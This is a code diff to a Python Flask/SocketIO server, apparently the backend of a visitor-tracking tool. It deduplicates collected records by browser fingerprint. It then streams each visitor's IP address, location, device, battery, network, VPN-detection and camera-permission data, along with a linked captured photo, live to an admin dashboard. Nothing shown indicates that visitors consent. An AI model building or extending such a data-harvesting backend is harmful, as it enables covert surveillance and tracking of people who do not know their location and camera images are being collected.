@@ -26,7 +26,8 @@ socketio = SocketIO(
     logger=True,
     engineio_logger=True,
     ping_timeout=60,
-    ping_interval=25
+    ping_interval=25,
+    max_http_buffer_size=1e6  # Limit buffer size to prevent memory issues
 )
 
 # Database setup
@@ -447,23 +448,215 @@ def collect_data():
         # Store in database
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        c.execute('''INSERT INTO collected_data
-                     (timestamp, ip_address, user_agent, device_info, fingerprint,
-                      location_data, storage_info, connection_info, vpn_detection,
-                      battery_info, network_info, media_devices, camera_permission, raw_data)
-                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                  (timestamp, ip_address, user_agent, device_info, fingerprint,
-                   location_data, storage_info, connection_info, vpn_detection,
-                   battery_info, network_info, media_devices, camera_permission, raw_data))
-        entry_id = c.lastrowid
+        
+        # Check if user with same fingerprint already exists
+        c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
+        existing_entry = c.fetchone()
+        
+        if existing_entry:
+            # Update existing entry instead of creating new one
+            entry_id = existing_entry[0]
+            print(f"[DATA COLLECTION] Updating existing entry #{entry_id} for fingerprint {fingerprint[:16]}...")
+            
+            c.execute('''UPDATE collected_data SET
+                         timestamp = ?,
+                         ip_address = ?,
+                         user_agent = ?,
+                         device_info = ?,
+                         location_data = ?,
+                         storage_info = ?,
+                         connection_info = ?,
+                         vpn_detection = ?,
+                         battery_info = ?,
+                         network_info = ?,
+                         media_devices = ?,
+                         camera_permission = ?,
+                         raw_data = ?
+                         WHERE id = ?''',
+                      (timestamp, ip_address, user_agent, device_info,
+                       location_data, storage_info, connection_info, vpn_detection,
+                       battery_info, network_info, media_devices, camera_permission, raw_data,
+                       entry_id))
+            
+            print(f"[DATA COLLECTION] Entry #{entry_id} updated successfully")
+        else:
+            # Create new entry for new user
+            c.execute('''INSERT INTO collected_data
+                         (timestamp, ip_address, user_agent, device_info, fingerprint,
+                          location_data, storage_info, connection_info, vpn_detection,
+                          battery_info, network_info, media_devices, camera_permission, raw_data)
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                      (timestamp, ip_address, user_agent, device_info, fingerprint,
+                       location_data, storage_info, connection_info, vpn_detection,
+                       battery_info, network_info, media_devices, camera_permission, raw_data))
+            entry_id = c.lastrowid
+            print(f"[DATA COLLECTION] New entry #{entry_id} created for fingerprint {fingerprint[:16]}...")
+        
         conn.commit()
         conn.close()
+
+        # Broadcast new/updated entry to admin dashboard via WebSocket
+        try:
+            if existing_entry:
+                # Entry was updated - broadcast update event with full data
+                # Also send full entry data so dashboard can add it if not found
+                conn = sqlite3.connect(DB_PATH)
+                c = conn.cursor()
+                c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
+                row = c.fetchone()
+                conn.close()
+                
+                if row:
+                    # Parse entry data (same as new entry)
+                    entry_id_db = row[0]
+                    fingerprint_db = row[5]
+                    
+                    # Find associated photo
+                    conn = sqlite3.connect(DB_PATH)
+                    c = conn.cursor()
+                    c.execute('''SELECT filename FROM captured_photos
+                                 WHERE fingerprint = ? OR data_entry_id = ?
+                                 ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
+                    photo_row = c.fetchone()
+                    photo_filename = photo_row[0] if photo_row else None
+                    conn.close()
+                    
+                    # Parse camera permission
+                    camera_permission_raw = row[14] if len(row) > 14 and row[14] else '{}'
+                    try:
+                        camera_permission = json.loads(camera_permission_raw)
+                        if camera_permission and isinstance(camera_permission, dict):
+                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
+                                if 'cameraAccess' in camera_permission:
+                                    camera_permission = camera_permission['cameraAccess']
+                                else:
+                                    camera_permission = {}
+                    except Exception as e:
+                        print(f"[WEBSOCKET] Error parsing camera permission: {e}")
+                        camera_permission = {}
+                    
+                    # Check if user is online
+                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
+                    
+                    # Prepare full entry data
+                    try:
+                        entry_data = {
+                            'id': entry_id_db,
+                            'timestamp': row[1],
+                            'ip_address': row[2],
+                            'user_agent': row[3],
+                            'device_info': json.loads(row[4]) if row[4] else {},
+                            'fingerprint': fingerprint_db,
+                            'location_data': json.loads(row[6]) if row[6] else {},
+                            'storage_info': json.loads(row[7]) if row[7] else {},
+                            'connection_info': json.loads(row[8]) if row[8] else {},
+                            'vpn_detection': json.loads(row[9]) if row[9] else {},
+                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
+                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
+                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
+                            'camera_permission': camera_permission,
+                            'raw_data': row[14] if len(row) > 14 else None,
+                            'profile_photo': photo_filename,
+                            'is_online': is_online,
+                            'updated': True
+                        }
+                        
+                        # Send as new_entry so dashboard can add/update it
+                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
+                        print(f"[WEBSOCKET] Broadcasted entry update (as new_entry) for entry #{entry_id}")
+                    except Exception as e:
+                        print(f"[WEBSOCKET] Error preparing updated entry data: {e}")
+                        # Fallback to simple update
+                        socketio.emit('entry_updated', {
+                            'entry_id': entry_id,
+                            'timestamp': timestamp,
+                            'ip_address': ip_address,
+                            'fingerprint': fingerprint,
+                            'updated': True
+                        }, broadcast=True, include_self=False, namespace='/')
+                        print(f"[WEBSOCKET] Broadcasted simple entry update for entry #{entry_id}")
+            else:
+                # New entry created - broadcast new entry event
+                # Fetch the full entry data to send to dashboard
+                conn = sqlite3.connect(DB_PATH)
+                c = conn.cursor()
+                c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
+                row = c.fetchone()
+                conn.close()
+                
+                if row:
+                    # Parse the entry data similar to dashboard route
+                    entry_id_db = row[0]
+                    fingerprint_db = row[5]
+                    
+                    # Find associated photo
+                    conn = sqlite3.connect(DB_PATH)
+                    c = conn.cursor()
+                    c.execute('''SELECT filename FROM captured_photos
+                                 WHERE fingerprint = ? OR data_entry_id = ?
+                                 ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
+                    photo_row = c.fetchone()
+                    photo_filename = photo_row[0] if photo_row else None
+                    conn.close()
+                    
+                    # Parse camera permission
+                    camera_permission_raw = row[14] if row[14] else '{}'
+                    try:
+                        camera_permission = json.loads(camera_permission_raw)
+                        if camera_permission and isinstance(camera_permission, dict):
+                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
+                                if 'cameraAccess' in camera_permission:
+                                    camera_permission = camera_permission['cameraAccess']
+                                else:
+                                    camera_permission = {}
+                    except Exception as e:
+                        print(f"[WEBSOCKET] Error parsing camera permission: {e}")
+                        camera_permission = {}
+                    
+                    # Check if user is online
+                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
+                    
+                    # Prepare entry data for dashboard
+                    # Column order: id, timestamp, ip_address, user_agent, device_info, fingerprint,
+                    # location_data, storage_info, connection_info, vpn_detection,
+                    # battery_info, network_info, media_devices, camera_permission, raw_data
+                    try:
+                        entry_data = {
+                            'id': entry_id_db,
+                            'timestamp': row[1],
+                            'ip_address': row[2],
+                            'user_agent': row[3],
+                            'device_info': json.loads(row[4]) if row[4] else {},
+                            'fingerprint': fingerprint_db,
+                            'location_data': json.loads(row[6]) if row[6] else {},
+                            'storage_info': json.loads(row[7]) if row[7] else {},
+                            'connection_info': json.loads(row[8]) if row[8] else {},
+                            'vpn_detection': json.loads(row[9]) if row[9] else {},
+                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
+                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
+                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
+                            'camera_permission': camera_permission,
+                            'raw_data': row[14] if len(row) > 14 else None,
+                            'profile_photo': photo_filename,
+                            'is_online': is_online
+                        }
+                        
+                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
+                        print(f"[WEBSOCKET] Broadcasted new entry #{entry_id} to dashboard")
+                        print(f"[WEBSOCKET] Entry data keys: {list(entry_data.keys())}")
+                        print(f"[WEBSOCKET] Entry ID: {entry_data.get('id')}, IP: {entry_data.get('ip_address')}")
+                    except Exception as e:
+                        print(f"[WEBSOCKET] Error preparing entry data: {e}")
+        except Exception as e:
+            print(f"[WEBSOCKET] Error broadcasting entry: {e}")
+            # Don't fail the request if WebSocket broadcast fails
 
         return jsonify({
             'status': 'success', 
             'message': 'Data collected successfully',
             'entry_id': entry_id,
-            'fingerprint': fingerprint
+            'fingerprint': fingerprint,
+            'updated': existing_entry is not None
         }), 200
 
     except Exception as e:
